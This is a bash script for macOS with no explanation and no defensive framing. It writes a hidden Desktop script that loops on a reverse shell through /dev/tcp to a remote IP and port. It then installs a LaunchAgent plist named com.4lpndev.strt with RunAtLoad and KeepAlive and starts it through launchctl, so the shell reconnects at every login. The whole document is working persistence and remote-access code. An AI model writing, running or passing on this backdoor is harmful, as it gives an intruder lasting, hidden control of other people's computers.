#!/bin/bash

USR=$(whoami)

echo "#!/bin/bash
while true; do
    bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'
    
    if [ $? -eq 0 ]; then
        break
    else
        sleep 5
    fi
done
" > /Users/$USR/Desktop/.runonstartupMACOS.sh

chmod +x /Users/$USR/Desktop/.runonstartupMACOS.sh

chmod 644 ~/Library/LaunchAgents/com.4lpndev.strt.plist
cat <<EOF > ~/Library/LaunchAgents/com.4lpndev.strt.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.4lpndev.strt</string>
    <key>ProgramArguments</key>
    <array>
      <string>/bin/bash</string>
      <string>/Users/$USR/Desktop/.runonstartupMACOS.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/mylogfile.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/myerrorlogfile.log</string>
  </dict>
</plist>
EOF


plutil ~/Library/LaunchAgents/com.4lpndev.strt.plist

launchctl unload ~/Library/LaunchAgents/com.4lpndev.strt.plist

launchctl load ~/Library/LaunchAgents/com.4lpndev.strt.plist

launchctl start com.4lpndev.strt
